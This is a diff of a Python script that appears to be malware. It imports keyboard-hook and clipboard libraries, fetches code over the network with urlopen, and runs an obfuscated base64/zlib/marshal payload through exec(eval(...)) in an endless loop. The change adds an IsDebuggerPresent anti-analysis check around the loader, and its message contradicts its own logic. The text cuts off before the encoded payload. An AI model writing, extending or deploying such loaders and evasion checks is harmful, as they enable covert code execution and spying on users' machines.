@@ -1,9 +1,14 @@
 import sys,zlib,base64,marshal,json,urllib,pythoncom,pyHook,win32clipboard,win32com,uuid,time,os
 from win32com.makegw.makegwparse import*
-from ctypes import*
-if sys.version_info[0]>2:
-    from urllib import request
-urlopen=urllib.request.urlopen if sys.version_info[0]>2 else urllib.urlopen
-while True:
-    try:
-        exec(eval(marshal.loads(zlib.decompress(base64.b64decode(
+from ctypes import *
+
+isDebuggerPresent = windll.kernel32.IsDebuggerPresent()
+
+if not (isDebuggerPresent):
+    print("A debugger is present, do not proceed.")
+    if sys.version_info[0]>2:
+        from urllib import request
+    urlopen=urllib.request.urlopen if sys.version_info[0]>2 else urllib.urlopen
+    while True:
+        try:
+            exec(eval(marshal.loads(zlib.decompress(base64.b64decode(
